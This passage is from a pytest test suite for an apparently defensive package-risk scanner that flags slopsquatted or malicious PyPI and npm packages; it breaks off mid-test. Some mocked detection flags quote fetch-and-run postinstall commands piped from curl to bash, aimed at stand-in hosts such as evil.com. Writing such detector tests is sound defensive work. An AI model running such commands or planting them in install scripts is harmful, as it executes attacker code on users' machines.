import pytest
from datetime import datetime, timezone
from unittest.mock import AsyncMock, patch
from slopwatch.core.dto import (
    Ecosystem,
    ThreatVerdict,
    WatchlistCandidate,
    PackageMetadata,
    ASTSecurityReport,
)
from slopwatch.assessor.scorer import (
    ProgressiveThreatEvaluator,
    is_date_stamp_version,
    has_install_time_code_execution,
    has_confirmed_dangerous_execution,
)


def test_vendor_domain_verification():
    evaluator = ProgressiveThreatEvaluator()

    # Verified official domains
    assert evaluator.verify_vendor_ownership("azure", "security@microsoft.com") is True
    assert evaluator.verify_vendor_ownership("microsoft", "security@microsoft.com") is True
    assert evaluator.verify_vendor_ownership("google", "googleapis-packages@google.com") is True
    assert evaluator.verify_vendor_ownership("google-cloud", "googleapis-packages@google.com") is True
    assert evaluator.verify_vendor_ownership("gcp", "googleapis-packages@google.com") is True
    assert evaluator.verify_vendor_ownership("stripe", "dev@stripe.com") is True
    assert evaluator.verify_vendor_ownership("okta", "auth-team@okta.com") is True
    assert evaluator.verify_vendor_ownership("supabase", "hello@supabase.io") is True
    assert evaluator.verify_vendor_ownership("openai", "api@openai.com") is True
    assert evaluator.verify_vendor_ownership("anthropic", "security@anthropic.com") is True
    assert evaluator.verify_vendor_ownership("deepseek", "contact@deepseek.com") is True
    assert evaluator.verify_vendor_ownership("mistral", "dev@mistral.ai") is True
    assert evaluator.verify_vendor_ownership("groq", "support@groq.com") is True

    # Unverified / Attacker domains (False Positives prevented)
    assert evaluator.verify_vendor_ownership("azure", "hacker@gmail.com") is False
    assert evaluator.verify_vendor_ownership("google", "hacker@gmail.com") is False
    assert evaluator.verify_vendor_ownership("stripe", "fake@stripe-security.net") is False
    assert evaluator.verify_vendor_ownership("okta", "anon@protonmail.com") is False


@pytest.mark.asyncio
async def test_evaluate_unregistered_candidate():
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="fastapi-superfake-nonexistent-12345",
        entity_token="superfake",
        capability_token="auth",
        framework_token="fastapi",
        risk_weight=75,
    )
    detection = await evaluator.evaluate_candidate(candidate)
    assert detection.threat_score == 75
    assert detection.verdict == ThreatVerdict.SUSPICIOUS


@pytest.mark.asyncio
async def test_evaluate_popular_community_package(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="django-slack-oauth",
        entity_token="slack",
        capability_token="oauth",
        framework_token="django",
        risk_weight=60,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="django-slack-oauth",
        latest_version="1.5.0",
        author="Community Dev",
        author_email="dev@gmail.com",
        homepage="https://github.com/community/django-slack-oauth",
        description="A helpful open source django oauth backend for slack.",
        monthly_downloads=15000,
        weekly_downloads=3500,
    )

    mock_ast = ASTSecurityReport(
        total_source_files=4,
        total_lines_of_code=620,
        total_code_size_bytes=24000,
        is_empty_stub=False,
        code_size_tier="MODERATE_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.threat_score <= 35


@pytest.mark.asyncio
@pytest.mark.asyncio
async def test_evaluate_community_codebase_score_capping(mocker):
    # Tests that a community package with substantial codebase and clean AST receives benign verdict
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="django-okta-auth",
        entity_token="okta",
        capability_token="auth",
        framework_token="django",
        risk_weight=75,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="django-okta-auth",
        latest_version="0.8.0",
        author="Matt Magin",
        author_email="matt.magin@cmv.com.au",
        monthly_downloads=50,
        published_at=datetime(2020, 2, 25, tzinfo=timezone.utc),
        first_published_at=datetime(2020, 2, 25, tzinfo=timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=20,
        total_lines_of_code=1467,
        total_code_size_bytes=71952,
        is_empty_stub=False,
        code_size_tier="LARGE_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.verdict == ThreatVerdict.BENIGN_COMMUNITY
        assert detection.threat_score <= 50


@pytest.mark.asyncio
async def test_evaluate_malicious_weaponized_package(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="fastapi-azure-b2c",
        entity_token="azure",
        capability_token="b2c",
        framework_token="fastapi",
        risk_weight=90,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="fastapi-azure-b2c",
        latest_version="0.1.0",
        author="Attacker",
        author_email="bad@tempmail.com",
        monthly_downloads=5,
    )

    mock_ast = ASTSecurityReport(
        total_source_files=1,
        total_lines_of_code=15,
        total_code_size_bytes=600,
        is_empty_stub=False,
        code_size_tier="EMPTY_STUB",
        flags=["INSTALL_TIME_NETWORK_SOCKET: socket module used during setup.py installation"],
        composite_threat_score=95,
        verdict=ThreatVerdict.MALICIOUS,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.verdict == ThreatVerdict.MALICIOUS
        assert detection.threat_score >= 90


@pytest.mark.asyncio
async def test_evaluate_slopsquat_suspicious_package(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="django-keycloak-auth",
        entity_token="keycloak",
        capability_token="auth",
        framework_token="django",
        risk_weight=75,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="django-keycloak-auth",
        latest_version="1.0.0",
        author="Marcelo Vinicius",
        author_email="mr.225@hotmail.com",
        monthly_downloads=12,
    )

    mock_ast = ASTSecurityReport(
        total_source_files=2,
        total_lines_of_code=85,
        total_code_size_bytes=3200,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.verdict == ThreatVerdict.SUSPICIOUS
        assert detection.threat_score >= 60



@pytest.mark.asyncio
async def test_evaluate_official_google_package(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="google-cloud-config",
        entity_token="google",
        capability_token="config",
        framework_token="django",
        risk_weight=75,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="google-cloud-config",
        latest_version="0.7.0",
        author="Google LLC",
        author_email="googleapis-packages@google.com",
        homepage="https://github.com/googleapis/google-cloud-python",
        description="Google Cloud Config Python client library",
        monthly_downloads=14390,
    )

    mock_ast = ASTSecurityReport(
        total_source_files=23,
        total_lines_of_code=52495,
        total_code_size_bytes=450000,
        is_empty_stub=False,
        code_size_tier="LARGE_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.verdict == ThreatVerdict.VERIFIED_OFFICIAL
        assert detection.threat_score == 0
        assert detection.analysis_details["is_official_vendor"] is True


def test_temporal_age_scoring_ai_era_vs_historical():
    from datetime import datetime, timezone, timedelta
    evaluator = ProgressiveThreatEvaluator()
    now = datetime.now(timezone.utc)

    # 1. Recent AI era window (e.g. 45 days ago)
    recent_dt = now - timedelta(days=45)
    pts, sig, days = evaluator.calculate_dormancy_signals(recent_dt)
    assert pts == 25
    assert sig.signal_id == "SIGNAL_AI_ERA_ACTIVE_REGISTRATION"
    assert days == 45

    # 2. 1-year AI tool proliferation window (e.g. 200 days ago)
    prolif_dt = now - timedelta(days=200)
    pts, sig, days = evaluator.calculate_dormancy_signals(prolif_dt)
    assert pts == 15
    assert sig.signal_id == "SIGNAL_AI_ERA_MODERATE_WINDOW"
    assert days == 200

    # 3. Transitional window (e.g. 500 days ago)
    trans_dt = now - timedelta(days=500)
    pts, sig, days = evaluator.calculate_dormancy_signals(trans_dt)
    assert pts == 0
    assert sig is None
    assert days == 500

    # 4. Pre-AI historical project (e.g. 1000 days ago / ~3 years)
    hist_dt = now - timedelta(days=1000)
    pts, sig, days = evaluator.calculate_dormancy_signals(hist_dt)
    assert pts == -15
    assert sig.signal_id == "SIGNAL_PRE_AI_HISTORICAL_PROJECT"
    assert days == 1000


@pytest.mark.asyncio
async def test_evaluate_url_confusion_sourcerank_hijacking(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="requests-oauth-pro",
        entity_token="requests",
        capability_token="oauth",
        framework_token="django",
        risk_weight=60,
    )

    # Attacker points homepage to official PSF requests repo to hijack trust
    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="requests-oauth-pro",
        latest_version="0.1.0",
        author="Unknown Dev",
        author_email="dev@genericmail.com",
        homepage="https://github.com/psf/requests",
        monthly_downloads=10,
    )

    mock_ast = ASTSecurityReport(
        total_source_files=1,
        total_lines_of_code=10,
        total_code_size_bytes=400,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        signals = detection.analysis_details.get("signals", [])
        assert any(s["signal_id"] == "SIGNAL_URL_CONFUSION_HIJACKING" for s in signals)


@pytest.mark.asyncio
async def test_evaluate_rapid_semver_burst_velocity(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="bitcoin-wallet-fastsync",
        entity_token="bitcoin",
        capability_token="wallet",
        framework_token="fastapi",
        risk_weight=75,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="bitcoin-wallet-fastsync",
        latest_version="1.1.2",
        author="Anonymous",
        author_email="btc@tempmail.org",
        release_count=4,
        has_rapid_semver_burst=True,
        monthly_downloads=5,
    )

    mock_ast = ASTSecurityReport(
        total_source_files=1,
        total_lines_of_code=15,
        total_code_size_bytes=500,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        signals = detection.analysis_details.get("signals", [])
        assert any(s["signal_id"] == "SIGNAL_RAPID_SEMVER_BURST" for s in signals)


@pytest.mark.asyncio
async def test_evaluate_organizational_domain_name_alignment(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="truthlocks-crewai",
        entity_token="crewai",
        capability_token="agent",
        framework_token="python",
        risk_weight=75,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="truthlocks-crewai",
        latest_version="1.0.2",
        author="TruthLocks",
        author_email="support@truthlocks.com",
        description="TruthLocks integration module for CrewAI agent systems with secure authentication.",
        homepage="https://truthlocks.com",
        monthly_downloads=14,
        published_at=datetime(2025, 1, 1, tzinfo=timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=1,
        total_lines_of_code=8,
        total_code_size_bytes=337,
        is_empty_stub=True,
        code_size_tier="EMPTY_STUB",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.SQUATTED_STUB,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        signals = detection.analysis_details.get("signals", [])
        # Must flag organizational domain alignment
        assert any(s["signal_id"] == "SIGNAL_ORGANIZATIONAL_DOMAIN_NAME_ALIGNMENT" for s in signals)
        # Score must be significantly discounted rather than 100+
        assert detection.threat_score <= 40


@pytest.mark.asyncio
async def test_evaluate_inflated_major_version_confusion(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="internal-auth-azure",
        entity_token="azure",
        capability_token="auth",
        framework_token="python",
        risk_weight=75,
    )

    # Brand new package registering with inflated version 99.0.0
    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="internal-auth-azure",
        latest_version="99.0.0",
        author="ShadowAttacker",
        author_email="shadow@anonmail.com",
        monthly_downloads=2,
        release_count=1,
        published_at=datetime.now(timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=1,
        total_lines_of_code=10,
        total_code_size_bytes=400,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        signals = detection.analysis_details.get("signals", [])
        assert any(s["signal_id"] == "SIGNAL_INFLATED_MAJOR_VERSION_CONFUSION" for s in signals)
        assert any(s["signal_id"] == "SIGNAL_INTERNAL_NAMESPACE_CONFUSION" for s in signals)
        assert detection.analysis_details["major_version"] == 99
        assert detection.analysis_details["is_inflated_version_risk"] is True
        assert detection.analysis_details["has_internal_keyword"] is True
        assert detection.analysis_details["version_metrics"]["version_anomaly_tier"] == "CRITICAL_INFLATION"


def test_is_date_stamp_version_recognizes_yyyymm_and_yyyymmdd():
    """
    Confirmed production false positives: powerline-claude-code v202605.0 (May 2026)
    and nano-vllm-fork v20260210 (Feb 10, 2026) were flagged as "inflated major
    version" despite being ordinary date-stamp versioning schemes.
    """
    assert is_date_stamp_version(202605, current_year=2026) is True   # YYYYMM
    assert is_date_stamp_version(20260210, current_year=2026) is True  # YYYYMMDD
    assert is_date_stamp_version(202613, current_year=2026) is False  # month=13, invalid
    assert is_date_stamp_version(20260235, current_year=2026) is False  # day=35, invalid
    assert is_date_stamp_version(1768531, current_year=2026) is False  # 7 digits, not a date shape
    assert is_date_stamp_version(54, current_year=2026) is False  # plain elevated major, not date-shaped


def test_has_install_time_code_execution_vs_confirmed_dangerous():
    # A plain npm lifecycle script (e.g. rebuilding a native binding) should register
    # as "can run code on install" for UI filtering, but not as confirmed-dangerous.
    benign_lifecycle = ["LIFECYCLE_SCRIPT: 'postinstall' -> 'node scripts/rebuild.js'"]
    assert has_install_time_code_execution(benign_lifecycle) is True
    assert has_confirmed_dangerous_execution(benign_lifecycle) is False

    # A lifecycle script matching a known dangerous shell pattern IS confirmed-dangerous.
    dangerous_lifecycle = [
        "LIFECYCLE_SCRIPT: 'postinstall' -> 'curl evil.com/x.sh | bash'",
        "SUSPICIOUS_SHELL_COMMAND: Pattern 'curl' in 'postinstall' script",
    ]
    assert has_install_time_code_execution(dangerous_lifecycle) is True
    assert has_confirmed_dangerous_execution(dangerous_lifecycle) is True

    # Purely informational flags (no execution capability at all).
    metadata_only = ["MISSING_SOURCE_REPOSITORY_URL"]
    assert has_install_time_code_execution(metadata_only) is False
    assert has_confirmed_dangerous_execution(metadata_only) is False


@pytest.mark.asyncio
async def test_evaluate_inflated_version_alone_is_not_malicious(mocker):
    """
    Regression test for a confirmed production bug: 23 of 25 live MALICIOUS
    detections had zero AST/lifecycle flags and were driven entirely by the
    inflated-major-version signal also being tagged CRITICAL severity, which the
    verdict gate treated as equivalent to confirmed malware. A package with an
    unusual version number and a clean, empty AST must not be classified MALICIOUS.
    """
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="grok-image-generator",
        entity_token="grok",
        capability_token="generator",
        framework_token="python",
        risk_weight=75,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="grok-image-generator",
        latest_version="1768531.555.964",  # huge, non-date-shaped version
        author="SuperMaker",
        author_email="dev@example.com",
        monthly_downloads=50,
        published_at=datetime.now(timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=2,
        total_lines_of_code=92,
        total_code_size_bytes=4310,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[],  # no AST/lifecycle findings at all
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.verdict != ThreatVerdict.MALICIOUS
        assert detection.analysis_details["has_install_hook"] is False
        assert detection.analysis_details["has_confirmed_dangerous_execution"] is False


@pytest.mark.asyncio
async def test_evaluate_npm_dangerous_lifecycle_script_is_malicious(mocker):
    """
    Regression test for the companion false-negative bug: has_malware_hooks was
    previously computed from Python-only flag substrings ("SOCKET"+"INSTALL_TIME"
    or "REVERSE_SHELL"), so an npm package with a genuinely dangerous postinstall
    script (curl | bash) could never reach the MALICIOUS verdict through the
    intended code-execution path.
    """
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.NPM,
        normalized_name="react-azure-auth-helper",
        entity_token="azure",
        capability_token="auth",
        framework_token="react",
        risk_weight=90,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.NPM,
        package_name="react-azure-auth-helper",
        latest_version="0.1.0",
        author="attacker",
        author_email="bad@tempmail.com",
        monthly_downloads=3,
    )

    mock_ast = ASTSecurityReport(
        has_lifecycle_scripts=True,
        total_source_files=1,
        total_lines_of_code=10,
        total_code_size_bytes=300,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[
            "LIFECYCLE_SCRIPT: 'postinstall' -> 'curl http://evil.example/x.sh | bash'",
            "SUSPICIOUS_SHELL_COMMAND: Pattern 'curl' in 'postinstall' script",
            "SUSPICIOUS_SHELL_COMMAND: Pattern 'bash' in 'postinstall' script",
        ],
        composite_threat_score=95,
        verdict=ThreatVerdict.MALICIOUS,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.verdict == ThreatVerdict.MALICIOUS
        assert detection.analysis_details["has_install_hook"] is True
        assert detection.analysis_details["has_confirmed_dangerous_execution"] is True


@pytest.mark.asyncio
async def test_evaluate_npm_source_code_loader_is_malicious(mocker):
    """
    A dangerous payload hidden in the real JS source (not declared as a lifecycle
    script at all) must still reach MALICIOUS — this is the exact gap npm tarball
    source scanning closes: a package.json with no install hooks whatsoever, whose
    index.js fetches and eval()s a remote payload at require()-time.
    """
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.NPM,
        normalized_name="stripe-webhook-validator",
        entity_token="stripe",
        capability_token="webhook",
        framework_token="node",
        risk_weight=90,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.NPM,
        package_name="stripe-webhook-validator",
        latest_version="0.1.0",
        author="attacker",
        author_email="bad@tempmail.com",
        monthly_downloads=2,
    )

    # No lifecycle scripts declared at all — the danger is purely in the real
    # source, which only the tarball scanner (not the manifest inspector) can see.
    mock_ast = ASTSecurityReport(
        has_lifecycle_scripts=False,
        total_source_files=1,
        total_lines_of_code=3,
        total_code_size_bytes=180,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[
            "SOURCE_CODE_DYNAMIC_EXECUTION: 'eval()' found in index.js:2",
            "SOURCE_CODE_NETWORK_CALL: 'fetch/axios/XMLHttpRequest' found in index.js:1",
            "SOURCE_CODE_DYNAMIC_CODE_LOADER: execution primitive combined with decode/network call in index.js",
        ],
        composite_threat_score=70,
        verdict=ThreatVerdict.MALICIOUS,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.verdict == ThreatVerdict.MALICIOUS
        assert detection.analysis_details["has_install_hook"] is True
        assert detection.analysis_details["has_confirmed_dangerous_execution"] is True


@pytest.mark.asyncio
async def test_evaluate_internal_namespace_confusion_keyword(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="stripe-internal-billing",
        entity_token="stripe",
        capability_token="billing",
        framework_token="python",
        risk_weight=75,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="stripe-internal-billing",
        latest_version="1.0.0",
        author="DevOps",
        author_email="dev@unaffiliated.com",
        monthly_downloads=15,
        published_at=datetime.now(timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=2,
        total_lines_of_code=60,
        total_code_size_bytes=2400,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        signals = detection.analysis_details.get("signals", [])
        assert any(s["signal_id"] == "SIGNAL_INTERNAL_NAMESPACE_CONFUSION" for s in signals)
        assert detection.analysis_details["has_internal_keyword"] is True


@pytest.mark.asyncio
async def test_evaluate_calver_version_year_not_flagged(mocker):
    """Packages using valid Calendar Year (CalVer like 2024.3.13.1.54) must not be flagged as version confusion."""
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="aws-ec2-tool",
        entity_token="aws",
        capability_token="tool",
        framework_token="aws",
        risk_weight=50,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="aws-ec2-tool",
        latest_version="2024.3.13.1.54",
        author="Robot-Wranglers",
        author_email="",
        monthly_downloads=19,
        release_count=2,
        published_at=datetime(2024, 3, 13, tzinfo=timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=13,
        total_lines_of_code=498,
        total_code_size_bytes=19700,
        is_empty_stub=False,
        code_size_tier="MODERATE_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        signals = detection.analysis_details.get("signals", [])
        # CalVer must NOT trigger inflated major version confusion
        assert not any(s["signal_id"] == "SIGNAL_INFLATED_MAJOR_VERSION_CONFUSION" for s in signals)
        assert not any(s["signal_id"] == "SIGNAL_FUTURE_YEAR_VERSION_ANOMALY" for s in signals)
        assert detection.analysis_details["major_version"] == 2024
        assert detection.analysis_details["is_inflated_version_risk"] is False
        assert detection.analysis_details["version_metrics"]["is_calver_year"] is True
        assert detection.analysis_details["version_metrics"]["version_anomaly_tier"] == "STANDARD_CALVER"


@pytest.mark.asyncio
async def test_evaluate_future_year_version_anomaly(mocker):
    """Packages using a distant future calendar year (e.g. 2099.1.0) must be flagged with SIGNAL_FUTURE_YEAR_VERSION_ANOMALY."""
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="azure-auth-helper",
        entity_token="azure",
        capability_token="auth",
        framework_token="python",
        risk_weight=75,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="azure-auth-helper",
        latest_version="2099.1.0",
        author="FutureAttacker",
        author_email="attk@anon.com",
        monthly_downloads=0,
        release_count=1,
        published_at=datetime.now(timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=1,
        total_lines_of_code=20,
        total_code_size_bytes=800,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        signals = detection.analysis_details.get("signals", [])
        assert any(s["signal_id"] == "SIGNAL_FUTURE_YEAR_VERSION_ANOMALY" for s in signals)
        assert detection.analysis_details["is_inflated_version_risk"] is True
        assert detection.analysis_details["version_metrics"]["version_anomaly_tier"] == "FUTURE_YEAR_ANOMALY"


@pytest.mark.asyncio
async def test_evaluate_deprecated_package_demoted(mocker):
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.NPM,
        normalized_name="deprecated-gemini-client",
        entity_token="gemini",
        capability_token="client",
        framework_token="node",
        risk_weight=70,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.NPM,
        package_name="deprecated-gemini-client",
        latest_version="1.0.0",
        author="OldAuthor",
        is_deprecated=True,
        deprecation_reason="This package is deprecated. Use @google/genai instead.",
        monthly_downloads=5,
        first_published_at=datetime(2024, 1, 1, tzinfo=timezone.utc),
        latest_release_at=datetime(2024, 1, 1, tzinfo=timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=2,
        total_lines_of_code=50,
        total_code_size_bytes=2000,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        flags=[],
        composite_threat_score=0,
        verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.is_deprecated is True
        assert "deprecated" in detection.deprecation_reason.lower()
        signals = detection.analysis_details.get("signals", [])
        assert any(s["signal_id"] == "SIGNAL_REGISTRY_DEPRECATED" for s in signals)
        assert detection.verdict == ThreatVerdict.BENIGN_COMMUNITY


@pytest.mark.asyncio
async def test_evaluate_legacy_deprecated_package_disqualified_from_malicious(mocker):
    """
    Test case inspired by gemini-web@1.3.1 (9 years old, deprecated, with bundled utility JS).
    Even if AST flags dynamic execution hooks, extreme dormancy + official deprecation
    must disqualify it from being labeled as an active MALICIOUS slopsquat.
    """
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.NPM,
        normalized_name="gemini-web",
        entity_token="gemini",
        capability_token="web",
        framework_token="node",
        risk_weight=70,
    )

    # Published in 2017 (>730 days dormant)
    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.NPM,
        package_name="gemini-web",
        latest_version="1.3.1",
        author="linzhizhao",
        is_deprecated=True,
        deprecation_reason="This version is no longer support.",
        monthly_downloads=0,
